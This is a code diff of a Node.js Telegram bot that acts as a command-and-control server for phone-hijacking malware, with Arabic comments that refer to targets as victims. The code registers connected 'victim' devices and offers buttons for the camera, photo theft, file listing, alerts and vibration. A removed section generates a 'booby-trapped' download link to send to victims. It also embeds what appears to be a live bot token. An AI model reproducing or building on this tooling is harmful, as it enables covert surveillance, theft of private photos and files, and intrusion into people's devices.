@@ -1,75 +1,69 @@
 const { Telegraf, Markup } = require('telegraf');
 const net = require('net');
-const fs = require('fs');
 
 const TOKEN = "8113157717:AAHUdnbkHj19lJHFhX4g93-GVSq9aE6nuLo";
 const ADMIN_ID = 6654753506; 
 const PORT = 10000;
 
-let activeAgents = {}; // لتخزين الأجهزة المتصلة ومعرفاتها
+let activeAgents = {}; 
 const bot = new Telegraf(TOKEN);
 
-// --- 1. خادم الاستقبال العكسي (C2 Server) ---
+// --- 1. خادم الاستقبال الذكي (C2 Server) ---
 const server = net.createServer((socket) => {
-    const agentId = `ID_${Math.floor(Math.random() * 1000)}`;
-    activeAgents[agentId] = socket;
+    socket.setKeepAlive(true, 60000); // منع انقطاع الاتصال المفاجئ
     
-    bot.telegram.sendMessage(ADMIN_ID, `✅ جـهاز جـديد متصل الآن!\n🆔 المعرف: ${agentId}\n⚠️ افتح القائمة للتحكم.`);
-    
-    socket.on('close', () => { delete activeAgents[agentId]; });
-    socket.on('error', () => { delete activeAgents[agentId]; });
+    socket.once('data', (data) => {
+        try {
+            const info = JSON.parse(data.toString()); // استقبال بيانات الجهاز (البطارية، الاسم)
+            const agentId = info.hostname || `Device_${Math.floor(Math.random()*1000)}`;
+            activeAgents[agentId] = { socket, info };
+
+            // إشعار لمرة واحدة فقط عند دخول الضحية
+            bot.telegram.sendMessage(ADMIN_ID, 
+                `✅ **جلسة جديدة نشطة!**\n\n` +
+                `📱 الجهاز: ${info.hostname}\n` +
+                `🔋 البطارية: ${info.battery}%\n` +
+                `🖥️ النظام: ${info.platform}\n` +
+                `🔌 الشحن: ${info.charging ? 'متصل' : 'غير متصل'}\n\n` +
+                `استخدم /control للتحكم.`, { parse_mode: 'Markdown' });
+        } catch (e) {
+            console.log("Error parsing initial data");
+        }
+    });
+
+    socket.on('error', () => { /* صمت مطبق عند الخطأ */ });
+    socket.on('close', () => { /* مسح الجلسة بهدوء */ });
 });
+
 server.listen(PORT, '0.0.0.0');
 
-// --- 2. قائمة البداية (Start Menu) ---
+// --- 2. لوحة التحكم الصامتة ---
 bot.start((ctx) => {
     if (ctx.from.id !== ADMIN_ID) return;
-    ctx.reply('🛡️ مرحباً بك في مختبر التلغيم والتحكم. اختر وجهتك:', 
+    ctx.reply('🛡️ مختبر الاختراق جاهز. لا رسائل تلقائية بعد الآن.', 
         Markup.inlineKeyboard([
-            [Markup.button.callback('🛠️ إنشاء رابط ملغم', 'make_link'), Markup.button.callback('🖼️ تلغيم ملف/صورة', 'make_payload')],
-            [Markup.button.callback('📱 الأجهزة المتصلة', 'list_agents')]
+            [Markup.button.callback('📱 الأجهزة المتصلة (الجلسات)', 'list_agents')],
+            [Markup.button.callback('🛠️ أدوات التلغيم', 'payload_tools')]
         ])
     );
 });
 
-// --- 3. معالج الأجهزة المتصلة (Control Center) ---
 bot.action('list_agents', (ctx) => {
     const ids = Object.keys(activeAgents);
-    if (ids.length === 0) return ctx.reply("❌ لا توجد أجهزة متصلة حالياً.");
+    if (ids.length === 0) return ctx.reply("❌ لا توجد جلسات نشطة حالياً.");
     
-    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم في ${id}`, `control_${id}`)]);
-    ctx.reply("🌐 الأجهزة النشطة بالمختبر:", Markup.inlineKeyboard(buttons));
+    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id} (${activeAgents[id].info.battery}%)`, `manage_${id}`)]);
+    ctx.reply("🌐 الجلسات المفتوحة الآن:", Markup.inlineKeyboard(buttons));
 });
 
-// --- 4. قائمة التحكم الكامل بالضحية ---
-bot.action(/^control_/, (ctx) => {
-    const agentId = ctx.match.input.split('_')[1];
-    ctx.reply(`🎮 التحكم الكامل في [${agentId}]:`, 
+bot.action(/^manage_/, (ctx) => {
+    const id = ctx.match.input.split('_')[1];
+    ctx.reply(`🎮 التحكم في ${id}:`, 
         Markup.inlineKeyboard([
-            [Markup.button.callback('📸 كاميرا أمامية', `cmd_${agentId}_cam1`), Markup.button.callback('📸 كاميرا خلفية', `cmd_${agentId}_cam0`)],
-            [Markup.button.callback('🔔 إرسال إشعار', `cmd_${agentId}_alert`), Markup.button.callback('📳 اهتزاز', `cmd_${agentId}_vibrate`)],
-            [Markup.button.callback('🖼️ سحب الصور', `cmd_${agentId}_pull`), Markup.button.callback('📂 قائمة الملفات', `cmd_${agentId}_ls`)]
+            [Markup.button.callback('📸 كاميرا', `cmd_${id}_cam`), Markup.button.callback('🖼️ سحب صور', `cmd_${id}_pull`)],
+            [Markup.button.callback('🔔 إشعار', `cmd_${id}_alert`), Markup.button.callback('📳 اهتزاز', `cmd_${id}_vibrate`)]
         ])
     );
-});
-
-// --- 5. إرسال الأوامر عبر السوكيت ---
-bot.action(/^cmd_/, (ctx) => {
-    const parts = ctx.match.input.split('_');
-    const agentId = parts[1];
-    const command = parts[2];
-    
-    if (activeAgents[agentId]) {
-        activeAgents[agentId].write(command);
-        ctx.answerCbQuery(`🚀 تم إرسال أمر ${command}...`);
-    } else {
-        ctx.reply("❌ انقطع اتصال الجهاز.");
-    }
-});
-
-// --- 6. منطق التلغيم (Payload Generation) ---
-bot.action('make_link', (ctx) => {
-    ctx.reply("🔗 الرابط الملغم جاهز:\n`http://your-app.onrender.com/download` \n(أرسله للضحية، بمجرد فتحه سيتصل بك)");
 });
 
 bot.launch();
